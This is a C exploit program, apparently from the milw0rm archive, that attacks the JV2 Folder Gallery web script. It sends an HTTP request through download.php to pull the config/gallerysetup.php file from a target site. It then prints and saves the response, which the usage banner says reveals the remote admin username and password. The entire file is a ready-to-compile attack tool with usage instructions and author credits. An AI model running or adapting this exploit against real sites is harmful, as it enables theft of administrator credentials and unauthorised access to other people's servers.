/*
Script Name  :JV2 Folder Gallery
Script site  :www.jv2.net

Discovered by    :SaO 
Exploit Coded by :PeTrO 
Credits To soulreaver,Kuz3y

Compile: Visual C++ or DevC++ 
         

*/

#include <stdio.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,"ws2_32.lib")

int main(int argc, char *argv[])
{

char gelenveri[1000];
char sendCommand[1000];
int i=0,sayac=0;

WSADATA wsdata;
SOCKET s;
struct hostent *hn;
struct sockaddr_in karsi_addr;
WSAStartup(MAKEWORD(2,0),&wsdata);



if(argc!=3)
{ 
     printf("\t**************************************************************\n"
            "\t*                                                            *\n"
            "\t*                   JV2 Folder Gallery                       *\n"                         
            "\t*        Remote Admin uName and Pass. Exploit by PeTrO       *\n"
            "\t*                                                            *\n"
            "\t*    Usage:exploit targetSite [GalleryPath]                  *\n"
            "\t*    Example:exploit localhost /gallery/                     *\n"
            "\t*                                                            *\n"
            "\t*    Discovered by    :SaO                                   *\n"
            "\t*    Exploit Coded by :PeTrO                                 *\n"
            "\t**************************************************************\n");
     
     exit(1);
}else{
      hn=gethostbyname(argv[1]);
     }

strcpy(sendCommand,"GET ");
strcat(sendCommand,argv[2]);
strcat(sendCommand,"download.php?file=config/gallerysetup.php \n\n");


printf("\n[+]Connecting....");
karsi_addr.sin_family = AF_INET;
karsi_addr.sin_port = htons(80);
karsi_addr.sin_addr =*((struct in_addr *)hn->h_addr);
memset(&(karsi_addr.sin_zero),'\0', 8);
if((s=socket(AF_INET, SOCK_STREAM, 0))==-1 ) //create a socket
{
    printf("\n[-]Socket Error");
    exit(-1);
}

if((connect(s,(struct sockaddr *)&karsi_addr,sizeof(struct sockaddr)))==-1)//connect server
{
    printf("\n[-]Connecting Error");
    exit(-1);
}

printf("\n[+]Sending command\n");
if((send(s,sendCommand,strlen(sendCommand),0))==-1)
{
    printf("\n[-]Sending Error");
    exit(-1);
}

if((recv(s,gelenveri,1000,0))==-1)
{
     printf("\n[-]Receive Error");
     exit(-1);
}

FILE *fp;

fp=fopen("data.txt","w");

for(i=0;sayac!=2;i++)
{
   if(gelenveri[i]==59) sayac++;
   
   printf("%c",gelenveri[i]);
}   
   
fprintf(fp,"%s",gelenveri);
   
WSACleanup();
return 0;
}

// milw0rm.com [2007-01-14]